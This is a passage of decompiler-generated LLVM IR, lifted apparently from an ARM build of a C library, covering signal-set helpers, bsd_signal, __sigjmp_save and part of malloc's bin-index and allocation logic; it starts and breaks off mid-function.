  br i1 %v7_28828, label %dec_label_pc_28840, label %dec_label_pc_2882c

dec_label_pc_2882c:                               ; preds = %dec_label_pc_28824, %entry
  %v0_2882c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_28838 = inttoptr i32 %v0_2882c to i32*
  store i32 22, i32* %v2_28838, align 4
  %v0_28848.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_28848

dec_label_pc_28840:                               ; preds = %dec_label_pc_28824
  %v0_28840 = call i32 @__sigdelset()
  store i32 %v0_28840, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_28848

dec_label_pc_28848:                               ; preds = %dec_label_pc_2882c, %dec_label_pc_28840
  %v0_28848 = phi i32 [ %v0_28848.pre, %dec_label_pc_2882c ], [ %v0_28840, %dec_label_pc_28840 ]
  ret i32 %v0_28848

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_28848, { 1, 0 }
}

define i32 @sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_28870, label %dec_label_pc_28868

dec_label_pc_28868:                               ; preds = %entry
  %v7_2886c = icmp slt i32 %arg1, 65
  br i1 %v7_2886c, label %dec_label_pc_28884, label %dec_label_pc_28870

dec_label_pc_28870:                               ; preds = %dec_label_pc_28868, %entry
  %v0_28870 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_2887c = inttoptr i32 %v0_28870 to i32*
  store i32 22, i32* %v2_2887c, align 4
  %v0_2888c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2888c

dec_label_pc_28884:                               ; preds = %dec_label_pc_28868
  %v0_28884 = call i32 @__GI___sigismember()
  store i32 %v0_28884, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2888c

dec_label_pc_2888c:                               ; preds = %dec_label_pc_28870, %dec_label_pc_28884
  %v0_2888c = phi i32 [ %v0_2888c.pre, %dec_label_pc_28870 ], [ %v0_28884, %dec_label_pc_28884 ]
  ret i32 %v0_2888c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2888c, { 1, 0 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_2889c = load i32, i32* @r1, align 4
  %v2_2889c = icmp eq i32 %v0_2889c, 0
  %v3_288a0 = load i32, i32* @r4, align 4
  store i32 %v3_288a0, i32* %stack_var_-8, align 4
  %v0_288a4 = load i32, i32* @r0, align 4
  store i32 %v0_288a4, i32* %r4.global-to-local, align 4
  br i1 %v2_2889c, label %dec_label_pc_288c8, label %dec_label_pc_288ac

dec_label_pc_288ac:                               ; preds = %entry
  %v1_288b4 = add i32 %v0_288a4, 260
  %v3_288b8 = call i32 @__GI_sigprocmask(i32 0, i32 0, i32 %v1_288b4)
  %v2_288bc = icmp eq i32 %v3_288b8, 0
  br i1 %v2_288bc, label %dec_label_pc_288cc, label %dec_label_pc_288c8

dec_label_pc_288c8:                               ; preds = %dec_label_pc_288ac, %entry
  br label %dec_label_pc_288cc

dec_label_pc_288cc:                               ; preds = %dec_label_pc_288ac, %dec_label_pc_288c8
  %storemerge = phi i32 [ 0, %dec_label_pc_288c8 ], [ 1, %dec_label_pc_288ac ]
  %v1_288d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_288d0 = add i32 %v1_288d0, 256
  %v3_288d0 = inttoptr i32 %v2_288d0 to i32*
  store i32 %storemerge, i32* %v3_288d0, align 4
  %v2_288d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_288d4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 260, { 12, 3, 0, 4, 5, 6, 7, 8, 1, 2, 10, 9, 11 }
  uselistorder label %dec_label_pc_288cc, { 1, 0 }
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_288dc = load i32, i32* @r4, align 4
  store i32 %v3_288dc, i32* %stack_var_-16, align 4
  %v6_288dc = load i32, i32* @r5, align 4
  %v9_288dc = load i32, i32* @r6, align 4
  %v7_288e4 = icmp eq i32 %arg2, -1
  br i1 %v7_288e4, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_288ec = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_28908

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_28910

dec_label_pc_28908:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v7_2890c = icmp slt i32 %arg1, 65
  br i1 %v7_2890c, label %dec_label_pc_28924, label %dec_label_pc_28910

dec_label_pc_28910:                               ; preds = %.thread16, %dec_label_pc_28908
  %v0_28910 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_2891c = inttoptr i32 %v0_28910 to i32*
  store i32 22, i32* %v2_2891c, align 4
  %v0_2897c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_28924:                               ; preds = %dec_label_pc_28908
  %v2_28924 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_28924, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_2892c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_2892c, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_2893c = call i32 @__sigaddset()
  %v0_28944 = load i32, i32* @r5, align 4
  store i32 %v0_28944, i32* @r1, align 4
  %v0_28948 = load i32, i32* @r6, align 4
  %v2_28948 = add i32 %v0_28948, 60920
  store i32 %v2_28948, i32* @r0, align 4
  %v0_2894c = call i32 @__GI___sigismember()
  store i32 %v2_288ec, i32* %r2.global-to-local, align 4
  %v0_28964 = load i32, i32* @r5, align 4
  %v4_2896c = call i32 @__GI_sigaction(i32 %v0_28964, i32* nonnull %stack_var_-36, i32 %v2_288ec)
  %v1_28970 = icmp slt i32 %v4_2896c, 0
  br i1 %v1_28970, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_28924
  %v5_28974 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_28974, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_28924
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_28910, %bb32
  %v0_2897c = phi i32 [ %v5_28974, %bb31 ], [ %v0_2897c.pre, %dec_label_pc_28910 ], [ -1, %bb32 ]
  %v2_28984 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_28984, i32* @r4, align 4
  store i32 %v6_288dc, i32* @r5, align 4
  store i32 %v9_288dc, i32* @r6, align 4
  ret i32 %v0_2897c

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 65, { 3, 4, 5, 6, 10, 0, 8, 9, 7, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 3, 0, 2 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_28910, { 1, 0 }
}

define i32 @__GI___sigismember() local_unnamed_addr {
entry:
  %v0_28994 = load i32, i32* @r1, align 4
  %v1_28994 = add i32 %v0_28994, -1
  %v3_28998 = udiv i32 %v1_28994, 32
  %v0_2899c = load i32, i32* @r0, align 4
  %v4_2899c = mul nuw nsw i32 %v3_28998, 4
  %v5_2899c = add i32 %v0_2899c, %v4_2899c
  %v6_2899c = inttoptr i32 %v5_2899c to i32*
  %v7_2899c = load i32, i32* %v6_2899c, align 4
  %v1_289a0 = urem i32 %v1_28994, 32
  %v7_289a8 = shl i32 1, %v1_289a0
  %v8_289a8 = and i32 %v7_2899c, %v7_289a8
  %v10_289a8 = icmp ne i32 %v8_289a8, 0
  %. = zext i1 %v10_289a8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_28994, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_289b8 = load i32, i32* @r1, align 4
  %v1_289b8 = add i32 %v0_289b8, -1
  %v3_289bc = udiv i32 %v1_289b8, 32
  %v0_289c0 = load i32, i32* @r0, align 4
  %v4_289c0 = mul nuw nsw i32 %v3_289bc, 4
  %v5_289c0 = add i32 %v0_289c0, %v4_289c0
  %v6_289c0 = inttoptr i32 %v5_289c0 to i32*
  %v7_289c0 = load i32, i32* %v6_289c0, align 4
  %v1_289c4 = urem i32 %v1_289b8, 32
  %v7_289cc = shl i32 1, %v1_289c4
  %v8_289cc = or i32 %v7_289c0, %v7_289cc
  store i32 %v8_289cc, i32* %v6_289c0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_289b8, { 1, 0 }
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %v0_289dc = load i32, i32* @r1, align 4
  %v1_289dc = add i32 %v0_289dc, -1
  %v3_289e0 = udiv i32 %v1_289dc, 32
  %v0_289e4 = load i32, i32* @r0, align 4
  %v4_289e4 = mul nuw nsw i32 %v3_289e0, 4
  %v5_289e4 = add i32 %v0_289e4, %v4_289e4
  %v6_289e4 = inttoptr i32 %v5_289e4 to i32*
  %v7_289e4 = load i32, i32* %v6_289e4, align 4
  %v1_289e8 = urem i32 %v1_289dc, 32
  %tmp = shl i32 -1, %v1_289e8
  %v8_289f0 = add i32 %tmp, -1
  %v9_289f0 = and i32 %v7_289e4, %v8_289f0
  store i32 %v9_289f0, i32* %v6_289e4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_289dc, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_28a00 = udiv i32 %arg1, 256
  store i32 %v3_28a00, i32* %r1.global-to-local, align 4
  %v2_28a04 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_28a04, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_28a10 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_28a04, i32 %v0_28a10)
  %v0_28a14 = load i32, i32* %r1.global-to-local, align 4
  %v1_28a14 = add i32 %v0_28a14, 1048320
  %v3_28a18 = udiv i32 %v1_28a14, 65536
  %v1_28a1c = and i32 %v3_28a18, 8
  %v6_28a20 = shl i32 %v0_28a14, %v1_28a1c
  %v1_28a24 = add i32 %v6_28a20, 520192
  %v3_28a28 = udiv i32 %v1_28a24, 65536
  %v1_28a2c = and i32 %v3_28a28, 4
  %v6_28a30 = shl i32 %v6_28a20, %v1_28a2c
  %v1_28a34 = add i32 %v6_28a30, 245760
  %v3_28a38 = udiv i32 %v1_28a34, 65536
  %v1_28a3c = and i32 %v3_28a38, 2
  %v6_28a40 = shl i32 %v6_28a30, %v1_28a3c
  store i32 %v6_28a40, i32* %r1.global-to-local, align 4
  %v1_28a44 = sub nsw i32 13, %v1_28a1c
  %v2_28a48 = sub nsw i32 %v1_28a44, %v1_28a2c
  %v3_28a4c = udiv i32 %v6_28a40, 32768
  %v4_28a4c = sub nuw nsw i32 -1, %v3_28a4c
  %v4_28a50 = udiv i32 %v6_28a40, 16384
  %v5_28a50 = and i32 %v4_28a50, %v4_28a4c
  %v2_28a54 = sub nsw i32 %v2_28a48, %v1_28a3c
  %v2_28a58 = add nsw i32 %v2_28a54, %v5_28a50
  %v1_28a5c = add nsw i32 %v2_28a58, 6
  %v0_28a60 = load i32, i32* %ip.global-to-local, align 4
  %v6_28a60 = lshr i32 %v0_28a60, %v1_28a5c
  %v3_28a64 = mul nsw i32 %v2_28a58, 4
  %v1_28a68 = add nsw i32 %v3_28a64, 32
  %v1_28a6c = urem i32 %v6_28a60, 4
  %v2_28a70 = or i32 %v1_28a6c, %v1_28a68
  ret i32 %v2_28a70

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_28a78 = load i32, i32* @r4, align 4
  %v6_28a78 = load i32, i32* @r5, align 4
  %v9_28a78 = load i32, i32* @r6, align 4
  %v12_28a78 = load i32, i32* @r7, align 4
  %v15_28a78 = load i32, i32* @r8, align 4
  %v18_28a78 = load i32, i32* @sb, align 4
  %v21_28a78 = load i32, i32* @sl, align 4
  %v24_28a78 = load i32, i32* @fp, align 4
  %v27_28a78 = load i32, i32* @lr, align 4
  store i32 156, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r1.global-to-local, align 4
  %v4_28a8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 156) to i32*), align 4
  store i32 %v4_28a8c, i32* %r4.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v4_28a98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 96) to i32*), align 4
  store i32 %v4_28a98, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_28a8c, i32* @r2, align 4
  %v2_28aa4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_28aa4, i32* %r0.global-to-local, align 4
  store i32 164, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  %v4_28ab0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  store i32 %v4_28ab0, i32* %ip.global-to-local, align 4
  store i32 166588, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_28ab0)
  %v0_28abc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_28abc, i32* %r0.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r1, align 4
  %v4_28ac8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 36) to i32*), align 4
  store i32 %v4_28ac8, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_28ad4.1757 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_28ac8)
  %v0_28ad4 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_28ad4, -32
  br i1 %tmp, label %dec_label_pc_28af0, label %dec_label_pc_28adc

dec_label_pc_28adc:                               ; preds = %entry
  %v0_28adc = call i32 @__GI___errno_location()
  store i32 %v0_28adc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_28ae8 = inttoptr i32 %v0_28adc to i32*
  store i32 12, i32* %v2_28ae8, align 4
  br label %dec_label_pc_2936c

dec_label_pc_28af0:                               ; preds = %entry
  %v1_28af0 = add i32 %v0_28ad4, 11
  store i32 %v1_28af0, i32* %r0.global-to-local, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  %v2_28afc = icmp ugt i32 %v1_28af0, 14
  %v7_28afc = icmp eq i32 %v1_28af0, 15
  %v2_28b00 = xor i1 %v7_28afc, true
  %v3_28b00 = and i1 %v2_28afc, %v2_28b00
  br i1 %v3_28b00, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_28af0
  %v5_28b00 = and i32 %v1_28af0, -8
  store i32 %v5_28b00, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_28af0, %bb
  %v4_28b04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_28b04, i32* @r0, align 4
  %v1_28b08 = inttoptr i32 %v4_28b04 to i32*
  %v2_28b08 = load i32, i32* %v1_28b08, align 4
  store i32 %v2_28b08, i32* @r4, align 4
  %v2_28b0c = xor i1 %v2_28afc, true
  %v3_28b0c = or i1 %v7_28afc, %v2_28b0c
  br i1 %v3_28b0c, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_28b10 = urem i32 %v2_28b08, 2
  %v2_28b10 = icmp eq i32 %v1_28b10, 0
  br i1 %v2_28b10, label %dec_label_pc_28b18, label %dec_label_pc_28b28

dec_label_pc_28b18:                               ; preds = %bb140
  %v2_28b18 = icmp eq i32 %v2_28b08, 0
  br i1 %v2_28b18, label %dec_label_pc_28b20, label %dec_label_pc_28f04

dec_label_pc_28b20:                               ; preds = %dec_label_pc_28b18
  %v0_28b20 = call i32 @__malloc_consolidate()
  store i32 %v0_28b20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_28f04

dec_label_pc_28b28:                               ; preds = %bb140
  %v0_28b28 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_28b28, %v2_28b08
  br i1 %tmp201, label %dec_label_pc_28b50, label %dec_label_pc_28b30

dec_label_pc_28b30:                               ; preds = %dec_label_pc_28b28
  %v1_28b30 = add i32 %v4_28b04, -4
  store i32 %v1_28b30, i32* %r1.global-to-local, align 4
  %v3_28b34 = udiv i32 %v0_28b28, 8
  store i32 %v3_28b34, i32* %r2.global-to-local, align 4
  %v4_28b38 = mul nuw i32 %v3_28b34, 4
  %v5_28b38 = add i32 %v4_28b38, %v1_28b30
  %v6_28b38 = inttoptr i32 %v5_28b38 to i32*
  %v7_28b38 = load i32, i32* %v6_28b38, align 4
  store i32 %v7_28b38, i32* %r0.global-to-local, align 4
  %v2_28b3c = icmp eq i32 %v7_28b38, 0
  br i1 %v2_28b3c, label %dec_label_pc_28b50, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_28b30
  %v2_28b40 = add i32 %v7_28b38, 8
  %v3_28b40 = inttoptr i32 %v2_28b40 to i32*
  %v4_28b40 = load i32, i32* %v3_28b40, align 4
  store i32 %v4_28b40, i32* %r3.global-to-local, align 4
  store i32 %v2_28b40, i32* %r0.global-to-local, align 4
  store i32 %v2_28b40, i32* %r4.global-to-local, align 4
  store i32 %v4_28b40, i32* %v6_28b38, align 4
  br label %dec_label_pc_29350

dec_label_pc_28b50:                               ; preds = %dec_label_pc_28b30, %dec_label_pc_28b28
  %tmp202 = icmp ugt i32 %v0_28b28, 255
  br i1 %tmp202, label %dec_label_pc_28ba0, label %dec_label_pc_28b58

dec_label_pc_28b58:                               ; preds = %dec_label_pc_28b50
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %ip.global-to-local, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  %v4_28b60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  %v3_28b64 = udiv i32 %v0_28b28, 8
  store i32 %v3_28b64, i32* @r7, align 4
  %v4_28b68 = mul nuw i32 %v3_28b64, 8
  %v5_28b68 = add i32 %v4_28b60, %v4_28b68
  store i32 %v5_28b68, i32* %r3.global-to-local, align 4
  %v1_28b6c = add i32 %v5_28b68, 44
  store i32 %v1_28b6c, i32* %ip.global-to-local, align 4
  %v1_28b70 = add i32 %v5_28b68, 56
  %v2_28b70 = inttoptr i32 %v1_28b70 to i32*
  %v3_28b70 = load i32, i32* %v2_28b70, align 4
  store i32 %v3_28b70, i32* %r0.global-to-local, align 4
  %v9_28b74 = icmp eq i32 %v3_28b70, %v1_28b6c
  br i1 %v9_28b74, label %dec_label_pc_28d00, label %dec_label_pc_28b7c

dec_label_pc_28b7c:                               ; preds = %dec_label_pc_28b58
  %v2_28b7c = add i32 %v3_28b70, %v0_28b28
  store i32 %v2_28b7c, i32* %r3.global-to-local, align 4
  %v1_28b80 = add i32 %v2_28b7c, 4
  %v2_28b80 = inttoptr i32 %v1_28b80 to i32*
  %v3_28b80 = load i32, i32* %v2_28b80, align 4
  store i32 %v3_28b80, i32* %r2.global-to-local, align 4
  %v1_28b84 = add i32 %v3_28b70, 12
  %v2_28b84 = inttoptr i32 %v1_28b84 to i32*
  %v3_28b84 = load i32, i32* %v2_28b84, align 4
  store i32 %v3_28b84, i32* %r1.global-to-local, align 4
  %v1_28b88 = or i32 %v3_28b80, 1
  store i32 %v1_28b88, i32* %r2.global-to-local, align 4
  %v1_28b8c = add i32 %v3_28b70, 8
  store i32 %v1_28b8c, i32* %r4.global-to-local, align 4
  store i32 %v1_28b88, i32* %v2_28b80, align 4
  %v0_28b94 = load i32, i32* %ip.global-to-local, align 4
  %v1_28b94 = load i32, i32* %r1.global-to-local, align 4
  %v2_28b94 = add i32 %v1_28b94, 8
  %v3_28b94 = inttoptr i32 %v2_28b94 to i32*
  store i32 %v0_28b94, i32* %v3_28b94, align 4
  %v0_28b98 = load i32, i32* %r1.global-to-local, align 4
  %v1_28b98 = load i32, i32* %ip.global-to-local, align 4
  %v2_28b98 = add i32 %v1_28b98, 12
  %v3_28b98 = inttoptr i32 %v2_28b98 to i32*
  store i32 %v0_28b98, i32* %v3_28b98, align 4
  br label %dec_label_pc_29350

dec_label_pc_28ba0:                               ; preds = %dec_label_pc_28b50
  store i32 %v0_28b28, i32* %r0.global-to-local, align 4
  %v1_28ba4 = call i32 @__malloc_largebin_index(i32 %v0_28b28)
  store i32 %v1_28ba4, i32* %r0.global-to-local, align 4
  %v0_28ba8 = load i32, i32* @r4, align 4
  %v1_28ba8 = and i32 %v0_28ba8, 2
  %v2_28ba8 = icmp eq i32 %v1_28ba8, 0
  store i32 %v1_28ba4, i32* @r7, align 4
  br i1 %v2_28ba8, label %dec_label_pc_28d00, label %dec_label_pc_28bb4

dec_label_pc_28bb4:                               ; preds = %dec_label_pc_28ba0
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r1.global-to-local, align 4
  %v4_28bbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 92) to i32*), align 4
  store i32 %v4_28bbc, i32* @r0, align 4
  %v0_28bc0 = call i32 @__malloc_consolidate()
  store i32 %v0_28bc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_28d00

dec_label_pc_28bc8:                               ; preds = %dec_label_pc_28d14
  %v1_28bc8 = add i32 %v3_28d14, 4
  %v2_28bc8 = inttoptr i32 %v1_28bc8 to i32*
  %v3_28bc8 = load i32, i32* %v2_28bc8, align 4
  store i32 %v3_28bc8, i32* %r3.global-to-local, align 4
  %v0_28bcc = load i32, i32* @sl, align 4
  %v1_28bd0 = and i32 %v3_28bc8, -4
  store i32 %v1_28bd0, i32* %r4.global-to-local, align 4
  %v1_28bd4 = add i32 %v3_28d14, 12
  %v2_28bd4 = inttoptr i32 %v1_28bd4 to i32*
  %v3_28bd4 = load i32, i32* %v2_28bd4, align 4
  store i32 %v3_28bd4, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_28bcc, 255
  br i1 %tmp203, label %dec_label_pc_28c30, label %dec_label_pc_28bdc

dec_label_pc_28bdc:                               ; preds = %dec_label_pc_28bc8
  %v9_28bdc = icmp eq i32 %v3_28bd4, %v0_28c34
  br i1 %v9_28bdc, label %dec_label_pc_28be4, label %dec_label_pc_28c30

dec_label_pc_28be4:                               ; preds = %dec_label_pc_28bdc
  %v0_28be4 = load i32, i32* @sb, align 4
  %v1_28be4 = add i32 %v0_28be4, 48
  %v2_28be4 = inttoptr i32 %v1_28be4 to i32*
  %v3_28be4 = load i32, i32* %v2_28be4, align 4
  store i32 %v3_28be4, i32* %r3.global-to-local, align 4
  %v9_28be8 = icmp eq i32 %v3_28d14, %v3_28be4
  br i1 %v9_28be8, label %dec_label_pc_28bf0, label %dec_label_pc_28c30

dec_label_pc_28bf0:                               ; preds = %dec_label_pc_28be4
  %v1_28bf0 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_28bd0, %v1_28bf0
  br i1 %tmp204, label %dec_label_pc_28bf8, label %dec_label_pc_28c30

dec_label_pc_28bf8:                               ; preds = %dec_label_pc_28bf0
  %v2_28bf8 = sub i32 %v1_28bd0, %v0_28bcc
  store i32 %v2_28bf8, i32* %r2.global-to-local, align 4
  %v2_28bfc = add i32 %v0_28bcc, %v3_28d14
  store i32 %v2_28bfc, i32* %r3.global-to-local, align 4
  %v1_28c00 = or i32 %v0_28bcc, 1
  store i32 %v1_28c00, i32* %r0.global-to-local, align 4
  %v1_28c04 = or i32 %v2_28bf8, 1
  store i32 %v1_28c04, i32* %r1.global-to-local, align 4
  %v1_28c08 = add i32 %v3_28d14, 8
  store i32 %v1_28c08, i32* %r4.global-to-local, align 4
  %v2_28c0c = add i32 %v0_28c34, 8
  %v3_28c0c = inttoptr i32 %v2_28c0c to i32*
  store i32 %v2_28bfc, i32* %v3_28c0c, align 4
  %v0_28c10 = load i32, i32* %r3.global-to-local, align 4
  %v1_28c10 = load i32, i32* %ip.global-to-local, align 4
  %v2_28c10 = add i32 %v1_28c10, 12
  %v3_28c10 = inttoptr i32 %v2_28c10 to i32*
  store i32 %v0_28c10, i32* %v3_28c10, align 4
  %v0_28c14 = load i32, i32* %r0.global-to-local, align 4
  %v1_28c14 = load i32, i32* @r6, align 4
  %v2_28c14 = add i32 %v1_28c14, 4
  %v3_28c14 = inttoptr i32 %v2_28c14 to i32*
  store i32 %v0_28c14, i32* %v3_28c14, align 4
  %v0_28c18 = load i32, i32* %r3.global-to-local, align 4
  %v1_28c18 = load i32, i32* @sb, align 4
  %v2_28c18 = add i32 %v1_28c18, 48
  %v3_28c18 = inttoptr i32 %v2_28c18 to i32*
  store i32 %v0_28c18, i32* %v3_28c18, align 4
  %v0_28c1c = load i32, i32* %r2.global-to-local, align 4
  %v1_28c1c = load i32, i32* %r3.global-to-local, align 4
  %v3_28c1c = add i32 %v1_28c1c, %v0_28c1c
  %v4_28c1c = inttoptr i32 %v3_28c1c to i32*
  store i32 %v0_28c1c, i32* %v4_28c1c, align 4
  %v0_28c20 = load i32, i32* %r1.global-to-local, align 4
  %v1_28c20 = load i32, i32* %r3.global-to-local, align 4
  %v2_28c20 = add i32 %v1_28c20, 4
  %v3_28c20 = inttoptr i32 %v2_28c20 to i32*
  store i32 %v0_28c20, i32* %v3_28c20, align 4
  %v0_28c24 = load i32, i32* %ip.global-to-local, align 4
  %v1_28c24 = load i32, i32* %r3.global-to-local, align 4
  %v2_28c24 = add i32 %v1_28c24, 12
  %v3_28c24 = inttoptr i32 %v2_28c24 to i32*
  store i32 %v0_28c24, i32* %v3_28c24, align 4
  %v0_28c28 = load i32, i32* %ip.global-to-local, align 4
  %v1_28c28 = load i32, i32* %r3.global-to-local, align 4
  %v2_28c28 = add i32 %v1_28c28, 8
  %v3_28c28 = inttoptr i32 %v2_28c28 to i32*
  store i32 %v0_28c28, i32* %v3_28c28, align 4
  br label %dec_label_pc_29350

dec_label_pc_28c30:                               ; preds = %dec_label_pc_28bf0, %dec_label_pc_28be4, %dec_label_pc_28bdc, %dec_label_pc_28bc8
  %v9_28c30 = icmp eq i32 %v1_28bd0, %v0_28bcc
  %v2_28c34 = add i32 %v3_28bd4, 8
  %v3_28c34 = inttoptr i32 %v2_28c34 to i32*
  store i32 %v0_28c34, i32* %v3_28c34, align 4
  %v0_28c38 = load i32, i32* %ip.global-to-local, align 4
  %v1_28c38 = load i32, i32* %r5.global-to-local, align 4
  %v2_28c38 = add i32 %v1_28c38, 12
  %v3_28c38 = inttoptr i32 %v2_28c38 to i32*
  store i32 %v0_28c38, i32* %v3_28c38, align 4
  br i1 %v9_28c30, label %dec_label_pc_28d90.loopexit, label %dec_label_pc_28c4c

dec_label_pc_28c4c:                               ; preds = %dec_label_pc_28c30
  %v0_28c4c = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_28c4c, 255
  br i1 %tmp205, label %dec_label_pc_28c70, label %dec_label_pc_28c54

dec_label_pc_28c54:                               ; preds = %dec_label_pc_28c4c
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  %v1_28c58 = load i32, i32* %r8.global-to-local, align 4
